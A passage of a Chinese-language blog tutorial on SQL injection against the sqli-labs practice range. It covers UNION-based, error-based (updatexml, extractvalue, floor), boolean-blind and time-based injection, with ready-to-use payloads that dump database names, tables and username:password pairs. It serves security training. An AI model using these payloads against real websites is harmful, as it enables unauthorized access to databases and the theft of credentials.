operator">+</span>vQ1rAnisBaP3rMk40i3OpallzVkuwRKydek3V9ufPpZEEH4eBgInMSDiMsggTWxcI<span class="token operator">/</span>Lvag6eHjkSc67RTrj96oxj0ipVRqjxW4X6HQIDAQAB"<span class="token punctuation">;</span>    var password <span class="token operator">=</span> String<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>    var encrypt <span class="token operator">=</span> new JSEncrypt<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    encrypt<span class="token punctuation">.</span>setPublicKey<span class="token punctuation">(</span>public_key<span class="token punctuation">)</span><span class="token punctuation">;</span>    en_password <span class="token operator">=</span> encrypt<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>    newpayload <span class="token operator">=</span> en_password        <span class="token operator">/</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">**</span><span class="token operator">/</span>    <span class="token keyword">return</span> newpayload<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="SQL注入漏洞1"><a href="#SQL注入漏洞1" class="headerlink" title="SQL注入漏洞1"></a>SQL注入漏洞1</h2><h3 id="靶场环境搭建"><a href="#靶场环境搭建" class="headerlink" title="靶场环境搭建"></a>靶场环境搭建</h3><h4 id="phpstudy切换版本"><a href="#phpstudy切换版本" class="headerlink" title="phpstudy切换版本"></a>phpstudy切换版本</h4><p>配置 phpstudy 中 php 版本为 5.x ，mysql 版本为 5.7.x</p><h4 id="sqli-labs数据库初始化"><a href="#sqli-labs数据库初始化" class="headerlink" title="sqli-labs数据库初始化"></a>sqli-labs数据库初始化</h4><p>初次使用靶场要进行初始化操作，安装数据库</p><p><img src="/2023/012220963/38.PNG" alt="38"></p><p>显示 successfully 表示安装成功~！</p><p><img src="/2023/012220963/39.PNG" alt="39"></p><p><strong>默认文件中mysql密码为空，要根据自己mysql密码来修改</strong></p><h4 id="hackbar插件安装"><a href="#hackbar插件安装" class="headerlink" title="hackbar插件安装"></a>hackbar插件安装</h4><p>从文件安装附件组件（HackBar V2目前免费使用）</p><p><img src="/2023/012220963/40.PNG" alt="40"></p><h3 id="mysql注入常见函数"><a href="#mysql注入常见函数" class="headerlink" title="mysql注入常见函数"></a>mysql注入常见函数</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">函数 <span class="token operator">/</span> 语句                     功能<span class="token keyword">order</span> <span class="token keyword">by</span>                       按指定列排序，可判断查询结果列数<span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                         当前用户名<span class="token keyword">current_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                 当前用户名（可用来查看权限）<span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                     当前所用数据库@<span class="token variable">@datadir</span>                      数据库的路径version<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> @<span class="token variable">@version</span>          数据库的版本@<span class="token variable">@version_compile_os</span>    查看操作系统版本concat<span class="token punctuation">(</span>str1<span class="token punctuation">,</span>str2<span class="token punctuation">)</span>    连接 N 个字符串concat_ws<span class="token punctuation">(</span>separator<span class="token punctuation">,</span>str1<span class="token punctuation">,</span>str2<span class="token punctuation">)</span> 用分隔符连接两个字段的字符串group_concat<span class="token punctuation">(</span>str1<span class="token punctuation">,</span>str2<span class="token punctuation">)</span>    将多行查询结果以逗号分隔全部输出substr<span class="token punctuation">(</span>string<span class="token punctuation">,</span><span class="token keyword">start</span><span class="token punctuation">,</span>length<span class="token punctuation">)</span>    将目标字符串从strat位置截取指定长度<span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span>                      返回结果中的前几条数据或者中间的数据<span class="token function">COUNT</span><span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>             返回指定列的值的数目（<span class="token boolean">NULL</span> 不计入）sleep<span class="token punctuation">(</span>num<span class="token punctuation">)</span>                     让语句暂停num秒的时间<span class="token keyword">if</span><span class="token punctuation">(</span>condition<span class="token punctuation">,</span> result1<span class="token punctuation">,</span> result2<span class="token punctuation">)</span> 判断一个条件，条件为真执行结果<span class="token number">1</span>，否则执行结果<span class="token number">2</span>load_file<span class="token punctuation">(</span><span class="token punctuation">)</span>                    读文件操作<span class="token keyword">Into</span> <span class="token keyword">outfile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token keyword">into</span> <span class="token keyword">dumpfile</span> 写文件操作<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="SQL注入中的注释符"><a href="#SQL注入中的注释符" class="headerlink" title="SQL注入中的注释符"></a>SQL注入中的注释符</h3><p>注释符用于将注入点中原有的sql语句后半段注释掉，以保证sql语句能够正常执行</p><pre class="line-numbers language-none"><code class="language-none">单行注释：#后面直接加内容多行注释：&#x2F;**&#x2F;中间可以跨行单行注释：-- 后面必须加空格<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="内敛注释"><a href="#内敛注释" class="headerlink" title="内敛注释"></a>内敛注释</h4><p>内联注释是MySQL数据库为了保持与其他数据库兼容，特意新添加的功能。</p><p>为了避免从MySQL中导出的SQL语句不能被其他数据库使用，它把一些MySQL特有的语句放在 /*! … */中，这些语句在不兼容的数据库中使用时便不会执行。而MySQL自身却能识别、执行。</p><p> /*!50001 */表示数据库版本&gt;=5.00.01时中间的语句才会执行，在SQL注入中，内联注释常用来绕过waf。</p><p><img src="/2023/012220963/41.PNG" alt="41"></p><h3 id="SQL注入流程"><a href="#SQL注入流程" class="headerlink" title="SQL注入流程"></a>SQL注入流程</h3><h4 id="1-寻找注入点"><a href="#1-寻找注入点" class="headerlink" title="1.寻找注入点"></a>1.寻找注入点</h4><p>得到目标网站的一般信息和技术分析信息之后，就要寻找注入点和测试注入点，这些点位都是与数据库有交互的地方</p><h5 id="常见注入点在哪里？"><a href="#常见注入点在哪里？" class="headerlink" title="常见注入点在哪里？"></a>常见注入点在哪里？</h5><p>我们一般在三个地方，寻找注入点</p><ol><li><p>表单中的输入参数</p></li><li><p>URL中的参数</p></li><li><p>Cookie或header头中其它参数</p></li></ol><p>用户信息、排名公布、文章展示、评论、搜索框、登陆框、cookie（session持久化需要存储在数据库中）</p><pre class="line-numbers language-none"><code class="language-none">1.与数据库有交互2.参数可控<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="sqli-less1"><a href="#sqli-less1" class="headerlink" title="sqli-less1"></a>sqli-less1</h5><p>发现提交 id 参数值的改变，影响页面结果，猜测后台的sql代码是： select 账号 密码 from 用户表;</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select username,password from users;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/012220963/42.PNG" alt="42"></p><h4 id="2-测试注入点-amp-amp-判断闭合符号"><a href="#2-测试注入点-amp-amp-判断闭合符号" class="headerlink" title="2.测试注入点&amp;&amp;判断闭合符号"></a>2.测试注入点&amp;&amp;判断闭合符号</h4><p>常用的测试符号</p><ul><li><p>单引号 ‘</p></li><li><p>双引号 “</p></li><li><p>无符号(直接拼接)</p></li><li><p>圆括号 ()</p></li></ul><p>这些符号通常是服务器后台代码中用来包裹用户输入变量的字符，当插入正确的闭合字符时，会破坏原有的sql语句；</p><h5 id="根据报错信息判断闭合符号"><a href="#根据报错信息判断闭合符号" class="headerlink" title="根据报错信息判断闭合符号"></a>根据报错信息判断闭合符号</h5><p><strong>输入</strong>常用<strong>闭合符</strong>号<strong>使</strong>页面抛出<strong>sql****语法</strong>错误的<strong>报错</strong>信息，根据报错信息可以发现闭合符号</p><p>less1</p><p><img src="/2023/012220963/43.PNG" alt="43"></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql"># 最外层的一对单引号是 mysql 报错打印模块自己加上的，去除掉以后，得到原始的报错代码段报错字符串为： &#39;&#39;3&#39;&#39; LIMIT 0,1&#39;# 去掉 最外层的一对引号原始报错代码： &#39;3&#39;&#39; LIMIT 0,1# 去掉我们输入的代码我们输入的值为： 3&#39; 由此即可判断出后台包裹变量字符串的符号为 单引号 &#39;# 使用注释符号，注释掉后边的sql语句此时我们输入 id&#x3D;3&#39;-- + 页面即可恢复正常，-- +注释掉了后边的语句，使sql能够正常执行# 得出结论：存在注入点为 id ，闭合符号为 单引号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="万能密码原理"><a href="#万能密码原理" class="headerlink" title="万能密码原理"></a>万能密码原理</h5><p>正常的后台sql语句：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">$sql &#x3D; &quot;SELECT * FROM users WHERE username &#x3D; &#39;$username&#39; and password &#x3D;&#39;$password&#39; limit 0,1;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在mysite网站中输入恶意字符 单引号 ‘ 提交数据 username=admin’ or 1# &amp;password=123 , sql语句变成：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin'</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token comment">#' and password = '$password'limit 0,1;</span>去掉被注释的内容，<span class="token keyword">sql</span>语句如下：<span class="token comment"># 由于admin账号存在，所以该语句恒为真，故登陆成功，这在sql注入中被称为万能密码</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin'</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin'</span> <span class="token operator">and</span> password <span class="token operator">=</span> <span class="token string">'123'</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token comment">#' limit 0,1;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-注入sql语句"><a href="#3-注入sql语句" class="headerlink" title="3.注入sql语句"></a>3.注入sql语句</h4><p>找到注入点以后，我们就可以执行相应的sql语句，来获取数据库中的信息</p><h5 id="UNION联合查询注入"><a href="#UNION联合查询注入" class="headerlink" title="UNION联合查询注入"></a>UNION联合查询注入</h5><p>联合查询是使用 union 或者 union all 拼接两条 select 语句来进行查询注入方式，效率非常高</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from users union all select user(),database(),version();<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="order-by语句"><a href="#order-by语句" class="headerlink" title="order by语句"></a>order by语句</h5><p>要注意的是联合查询前后两条 select 语句查询数据的列数是相等的，故需要使用 order by 语句来判断注入点sql语句查询的列数是多少</p><p>order by 排序超过查询结果列数的时候就会抛出错误，故可以使用它来判断前一条 select 语句查询结果的列数</p><p><img src="/2023/012220963/44.PNG" alt="44"></p><h6 id="二分法查找列数"><a href="#二分法查找列数" class="headerlink" title="二分法查找列数"></a>二分法查找列数</h6><p>先 order by 一个比较大的数字m，若报错再取其中位数 n 继续 order by， 若正常说明列数在 [n, m) 之间， 再取 n , m 之间的中位数 order by 如此反复多次，即可获取列数</p><h3 id="查询数据库内容常见语句"><a href="#查询数据库内容常见语句" class="headerlink" title="查询数据库内容常见语句"></a>查询数据库内容常见语句</h3><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">1.暴库：select group_concat(schema_name) from information_schema.schemata;2.暴表1：select group_concat(table_name) from information_schema.tables wheretable_schema&#x3D;&#39;security&#39;; 加引号  暴表2：select table_name from information_schema.tables wheretable_schema&#x3D;&#39;security&#39; limit 3,1; 加引号3.暴字段1：select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; and table_schema&#x3D;&#39;security&#39;; 加引号暴字段2：select column_name from information_schema.columns where table_name&#x3D;&#39;users&#39; and table_schema&#x3D;&#39;security&#39; limit 1,1;4.暴字段值：select group_concat(username,0x3a,password) from security.users; 不加引号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="联合查询暴库-amp-amp-暴数据"><a href="#联合查询暴库-amp-amp-暴数据" class="headerlink" title="联合查询暴库&amp;&amp;暴数据"></a>联合查询暴库&amp;&amp;暴数据</h4><p>暴库是查找所有数据库名的意思，mysql的注入可以从 information_schema 数据库中查询所有表的结构(库名、表名、字段名)信息</p><h5 id="sql-less1暴库"><a href="#sql-less1暴库" class="headerlink" title="sql-less1暴库"></a>sql-less1暴库</h5><p>由于回显位置可能被前一句 select 查到的结果占用，此时需要修改参数，让前一条 select 语句返回空结果，我们拼接的 select 的查询结果就会显示出来了</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select group_concat(schema_name) from information_schema.schemata; # 查询所有库名，并拼接为一条数据payload: id&#x3D;-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="sql-less1爆表"><a href="#sql-less1爆表" class="headerlink" title="sql-less1爆表"></a>sql-less1爆表</h5><p>获取指定数据库中所有表的名字</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;; # 查询security库中所有表名，并拼接为一条数据payload: id&#x3D;-1&#39; union select 1,2,group_concat(table_name) frominformation_schema.tables where table_schema&#x3D;&#39;security&#39; -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="sql-less1暴字段"><a href="#sql-less1暴字段" class="headerlink" title="sql-less1暴字段"></a>sql-less1暴字段</h5><p>获取指定库的指定表中的所有字段值</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; and table_schema&#x3D;&#39;security&#39;; # 查询 security 库中 users 表中的所有字段值，拼接为一条数据payload: id&#x3D;-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; and table_schema&#x3D;&#39;security&#39;-- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="sql-less1暴数据"><a href="#sql-less1暴数据" class="headerlink" title="sql-less1暴数据"></a>sql-less1暴数据</h5><p>获取数据库中的数据</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select group_concat(username,0x3a,password) from security.users; # 查询指定库中表的某些字段值payload: id&#x3D;-1&#39; union select 1,2,group_concat(username,0x3a,password) from security.users -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="SQL注入漏洞2"><a href="#SQL注入漏洞2" class="headerlink" title="SQL注入漏洞2"></a>SQL注入漏洞2</h2><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>mysql中的一些函数在报错时，会抛出错误代码，借此可以执行一些特定的sql语句来获取数据库的信息在有些时候虽然存在注入点能够执sql语句，但是页面中并没有打印sql执行结果的回显位置，但是如果页面<strong>能够抛出报错</strong>的代码信息，就可以<strong>利用报错回显</strong>，来查看注入的sql语句的执行结果</p><h4 id="报错注入常用函数"><a href="#报错注入常用函数" class="headerlink" title="报错注入常用函数"></a>报错注入常用函数</h4><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql"># 1.floor()select * from test where id&#x3D;1 and (select 1 from (select count(*),concat((select user()),floor(rand(0)*2))x from information_schema.tables group by x)a);# 2.extractvalue()select * from test where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));# 3.updatexml()select * from test where id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));# 4.geometrycollection()select * from test where id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b));# 5.multipoint()select * from test where id&#x3D;1 and multipoint((select * from(select * from(select user())a)b));# 6.polygon()select * from test where id&#x3D;1 and polygon((select * from(select * from(select user())a)b));# 7.multipolygon()select * from test where id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b));# 8.linestring()select * from test where id&#x3D;1 and linestring((select * from(select * from(select user())a)b));# 9.multilinestring()select * from test where id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b));# 10.exp()select * from test where id&#x3D;1 and exp(~(select * from(select user())a));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="函数报错原理"><a href="#函数报错原理" class="headerlink" title="函数报错原理"></a>函数报错原理</h4><h5 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h5><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from users where id&#x3D;1 and (select 1 from (selectcount(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>floor()报错注入的原因是<strong>group by</strong>在向临时表插入数据<strong>时，由于</strong>rand()多次计算导致插入临时表时主键重复<strong>，从而报错，又因为报错前</strong>concat()<strong>中的SQL</strong>语句或函数被执行，所以该语句报错且被抛出的主键是SQL语句或函数执行后的结果</p><p>该函数最大显示长度为64，超过长度可以配合substr、limit等函数来显示</p><h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h5><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from users where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>从目标XML中返回包含所查询值的字符串，如果Xpath格式语法书写错误的话，就会报错</p><p>该函数最大显示长度为32，超过长度可以配合substr、limit等函数来显示</p><h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h5><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select * from users where id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>updatexml的第二个参数需要Xpath格式的字符串，是用/xxx/xxx/xxx/…这种格式，以~开头的内容不是xml格式的语法，concat()函数为字符串连接函数显然不符合规则，但是会将括号内的执行结果以错误的形式报出</p><p>该函数最大显示长度为32，超过长度可以配合substr、limit等函数来显示</p><h4 id="sqli-less5注入"><a href="#sqli-less5注入" class="headerlink" title="sqli-less5注入"></a>sqli-less5注入</h4><p>输入参数 id=1 发现没有查询结果的回显</p><p><img src="/2023/012220963/45.PNG" alt="45"></p><h5 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="寻找注入点"></a>寻找注入点</h5><p>输入单引号后报错根据报错信息可知，闭合符号为单引号且非常重要的一点是，该页面能够抛出sql语句的报错信息</p><p><img src="/2023/012220963/46.PNG" alt="46"></p><h5 id="注入代码"><a href="#注入代码" class="headerlink" title="注入代码"></a>注入代码</h5><p>进行 union select 注入测试后发现没有结果回显，但因为页面能抛出报错信息，故选用报错注入</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and (updatexml(1,concat(0x7e,(select user()),0x7e),1)); -- +<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/012220963/47.PNG" alt="47"></p><h5 id="暴库-amp-amp-暴数据"><a href="#暴库-amp-amp-暴数据" class="headerlink" title="暴库&amp;&amp;暴数据"></a>暴库&amp;&amp;暴数据</h5><p>暴库或者暴数据的时候可能会遇到一些问题，sql语句的查询结果很长，但是updatexml函数只能抛出32位长度的报错信息，这个时候就要用到substr函数分段截取显示结果 或者 limit 逐行显示结果<strong>substr(str, start, length)</strong> 注意索引从 1 开始，每次截取 32 位，第二次索引从 32 开始再截取 32 位，以此类推</p><h6 id="暴库"><a href="#暴库" class="headerlink" title="暴库"></a>暴库</h6><p><strong>substr(substring,mid,left)</strong></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and (updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),0,32),0x7e),1)); -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/012220963/48.PNG" alt="48"></p><p>limit</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and (updatexml(1,concat(0x7e,substr((select schema_name from information_schema.schemata limit 0,1),1,32),0x7e),1)); -- +<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/012220963/49.PNG" alt="49"></p><h6 id="暴表"><a href="#暴表" class="headerlink" title="暴表"></a>暴表</h6><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and (updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;),1,32),0x7e),1)); -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h6 id="暴字段"><a href="#暴字段" class="headerlink" title="暴字段"></a>暴字段</h6><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and (updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; and table_schema&#x3D;&#39;security&#39;),1,32),0x7e),1)); -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h6 id="暴数据"><a href="#暴数据" class="headerlink" title="暴数据"></a>暴数据</h6><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and (updatexml(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from security.users),1,32),0x7e),1)); -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>布尔盲注一般适用于页面没有回显字段不支持联合查询和报错注入，且web页面返回True 或者 false，构造SQL语句，利用and，or等关键字来其后的语句 true 或 false 使web页面返回 true 或 false，从而达到注入的目的来获取信息</p><h4 id="sqli-less8"><a href="#sqli-less8" class="headerlink" title="sqli-less8"></a>sqli-less8</h4><p>单纯的输入某个符号不能判断出真正的闭合符号是什么，但是可以通过在语句后拼接 and 1 及 and 0来判断sql语句有没有成功执行，如果sql语句执行了说明你的闭合符号找对了</p><h4 id="判断闭合符号"><a href="#判断闭合符号" class="headerlink" title="判断闭合符号"></a>判断闭合符号</h4><p><strong>输入</strong> <strong>id = 1’ and 1 – +</strong> <strong>页面内容显示正常</strong></p><p><img src="/2023/012220963/50.PNG" alt="50"></p><p><strong>输入</strong> <strong>id = 1’ and 0 – +</strong> <strong>页面显示不正常</strong></p><p><img src="/2023/012220963/51.PNG" alt="51"></p><p><strong>由此判断出闭合符号位单引号</strong></p><h4 id="查询数据内容"><a href="#查询数据内容" class="headerlink" title="查询数据内容"></a>查询数据内容</h4><p>由于没有回显，我们只能利用一些函数来构造等式，判断数据内容</p><p>length() 函数返回一个字符串的长度，可以以用来判断字符串 sql 查询结果的长度</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">and length(database())&#x3D;8 -- + # 判断当前数据库名长度<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>substr() \ left() 函数 截取查询结果字符进行判断</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">and substr(database(),1,1)&#x3D;&#39;a&#39; -- + # 使用指定字符一位一位判断截取到的字符and left(database(),8)&#x3D;&#39;security&#39; -- + # 截取指定长度结果，进行判断# 可使用ascii函数，查询截取到字符的ascii码ascii(substr(database(),1,1))&#x3D;115 -- + # 使用ascii码一位一位比对截取到的字符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="burp盲注爆破"><a href="#burp盲注爆破" class="headerlink" title="burp盲注爆破"></a>burp盲注爆破</h4><p>标记参数</p><p><img src="/2023/012220963/52.PNG" alt="52"></p><p>payload1是 1-8 的数字</p><p><img src="/2023/012220963/53.PNG" alt="53"></p><p>payload2 是0~9、a-z、以及一些常见字符</p><p><img src="/2023/012220963/54.PNG" alt="54"></p><p>结果判断条件</p><p><img src="/2023/012220963/55.PNG" alt="55"></p><p>根据响应包来判断每一位字符,按顺序拼凑起来结果是 security</p><p><img src="/2023/012220963/56.PNG" alt="56"></p><p><strong>在进行暴库&amp;&amp;暴数据时都要先判断sql查询结果的长度，可以用二分法快速判断</strong></p><p>例如判断所有库名的长度</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and length((select group_concat(schema_name) from information_schema.schemata))&lt;200 -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="暴库-1"><a href="#暴库-1" class="headerlink" title="暴库"></a>暴库</h5><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and substr((select group_concat(schema_name) from information_schema.schemata),1,1)&#x3D;&#39;i&#39; -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h5><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;),1,1)&#x3D;&#39;e&#39; -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="暴字段-1"><a href="#暴字段-1" class="headerlink" title="暴字段"></a>暴字段</h5><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and substr((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; and table_schema&#x3D;&#39;security&#39;),1,1)&#x3D;&#39;i&#39; -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="暴数据-1"><a href="#暴数据-1" class="headerlink" title="暴数据"></a>暴数据</h5><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">payload: id&#x3D;1&#39; and substr((select group_concat(username,0x3a,password) from security.users),1,1)&#x3D;&#39;d&#39; -- +<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>延时注入是盲注的一种，在页面没有回显和报错，也不能通过拼接 and 0 、and 1 的布尔表达式来判断sql语句是否成功执行，只能在参数后and sleep(5) ， 加上延时函数sleep()， 如果sql语句执行页面刷新就会有一定的延时，根据页面是否有延时来判断sql语句执行与否所以叫做延时注入</p><h4 id="sqli-less9"><a href="#sqli-less9" class="headerlink" title="sqli-less9"></a>sqli-less9</h4><p>单纯的输入某个符号不能判断出真正的闭合符号是什么，但是可以通过在语句后拼接 and sleep(5) 来判断sql语句有没有成功执行，如果sql语句执行了说明你的闭合符号找对了</p><h4 id="判断闭合符号-1"><a href="#判断闭合符号-1" class="headerlink" title="判断闭合符号"></a>判断闭合符号</h4><p><strong>输入</strong> <strong>id=1’ and sleep(3) – +</strong> <strong>页面有3秒延时</strong></p><p><img src="/2023/012220963/57.PNG" alt="57"></p><p><strong>由此判断出闭合符号位单引号</strong></p><h4 id="查询数据内容-1"><a href="#查询数据内容-1" class="headerlink" title="查询数据内容"></a>查询数据内容</h4><p>由于没有回显，我们只能利用一些函数来构造等式，判断数据内容</p><p>length() 函数返回一个字符串的长度，可以以用来判断字符串 sql 查询结果的长度</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">and if(length(database()) &#x3D; 8, sleep(3),1) -- + # 判断当前数据库名长度<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>substr() \ left() 函数 截取查询结果字符进行判断</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">and if(substr(database(),1,1) &#x3D; &#39;s&#39;, sleep(3),1) -- + # 使用指定字符一位一位判断截取到的字符and if(left(database(),8)&#x3D;&#39;security&#39;, sleep(3),1) -- + # 截取指定长度结果，进行判断# 可使用ascii函数，查询截取到字符的ascii码and if(ascii(substr(database(),1,1))&#x3D;115, sleep(3),1) -- + # 使用ascii码一位一位比对截取到的字符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 